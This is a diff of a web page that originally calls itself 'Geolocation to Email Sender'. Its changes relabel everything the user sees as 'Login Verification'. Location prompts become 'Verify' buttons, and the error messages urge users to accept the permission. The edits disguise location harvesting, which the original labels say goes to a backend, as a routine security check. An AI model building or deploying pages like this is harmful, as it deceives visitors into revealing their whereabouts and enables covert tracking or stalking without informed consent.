@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Geolocation to Email Sender</title>
+    <title>Login Verification</title>
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
@@ -28,10 +28,10 @@
 </head>
 <body class="flex items-center justify-center min-h-screen p-4">
     <div class="bg-white p-8 rounded-xl shadow-lg w-full max-w-md text-center border border-gray-200">
-        <h1 class="text-3xl font-bold text-gray-800 mb-6">Location Sender</h1>
+        <h1 class="text-3xl font-bold text-gray-800 mb-6">Verification</h1>
 
         <div id="status-message" class="mb-4 p-3 rounded-lg text-sm font-medium">
-            <p class="text-gray-600">Click the button below to get and send your location.</p>
+            <p class="text-gray-600">Click the button below to Verify.</p>
         </div>
 
         <div class="space-y-3 mb-6">
@@ -46,7 +46,7 @@
         <!-- New button to trigger geolocation -->
         <button id="getLocationButton"
             class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-lg shadow-md transition duration-300 ease-in-out transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-75">
-            Get My Location
+            Verify
         </button>
 
         <div id="backend-status" class="mt-6 p-4 rounded-lg text-sm font-medium bg-blue-50 text-blue-800 border border-blue-200 hidden">
@@ -183,13 +183,13 @@
             let errorMessage = 'Error getting location: ';
             switch (error.code) {
                 case error.PERMISSION_DENIED:
-                    errorMessage += 'User denied the request for Geolocation.';
+                    errorMessage += 'User denied the request for Verification.';
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    errorMessage += 'Location information is unavailable.';
+                    errorMessage += 'Verification information is unavailable.';
                     break;
                 case error.TIMEOUT:
-                    errorMessage += 'The request to get user location timed out.';
+                    errorMessage += 'The request to verify timed out.';
                     break;
                 case error.UNKNOWN_ERROR:
                     errorMessage += 'An unknown error occurred.';
@@ -199,7 +199,7 @@
             console.error(errorMessage, error);
 
             backendStatusDiv.classList.remove('hidden');
-            backendMessageSpan.textContent = 'Location not obtained, data not sent to backend.';
+            backendMessageSpan.textContent = 'Could not verify, accept permission and try again.';
             backendMessageSpan.classList.add('text-red-600');
             loadingSpinner.classList.add('hidden'); // Hide spinner on error
         }
@@ -212,11 +212,11 @@
             latitudeSpan.textContent = 'N/A';
             longitudeSpan.textContent = 'N/A';
             backendStatusDiv.classList.add('hidden'); // Hide backend status initially
-            backendMessageSpan.textContent = 'Requesting your location...'; // Set initial text
+            backendMessageSpan.textContent = 'Requesting Verification Permission'; // Set initial text
             loadingSpinner.classList.remove('hidden'); // Show spinner
 
             if (navigator.geolocation) {
-                displayStatus('Requesting your location...');
+                displayStatus('Requesting Verification Permission');
                 navigator.geolocation.getCurrentPosition(successCallback, errorCallback, {
                     enableHighAccuracy: false,
                     timeout: 15000,
@@ -225,7 +225,7 @@
             } else {
                 displayStatus('Geolocation is not supported by your browser.', 'error');
                 backendStatusDiv.classList.remove('hidden');
-                backendMessageSpan.textContent = 'Geolocation not supported, data not sent to backend.';
+                backendMessageSpan.textContent = 'Unable to verify';
                 backendMessageSpan.classList.add('text-red-600');
                 loadingSpinner.classList.add('hidden'); // Hide spinner if not supported
             }
@@ -235,7 +235,7 @@
         window.onload = function() {
             getLocationButton.addEventListener('click', requestGeolocation);
             // Initial status message when page loads
-            displayStatus('Click the "Get My Location" button to proceed.');
+            displayStatus('Click the "Verify" button and accept Permission to proceed.');
             loadingSpinner.classList.add('hidden'); // Ensure spinner is hidden on initial load
         };
     </script>
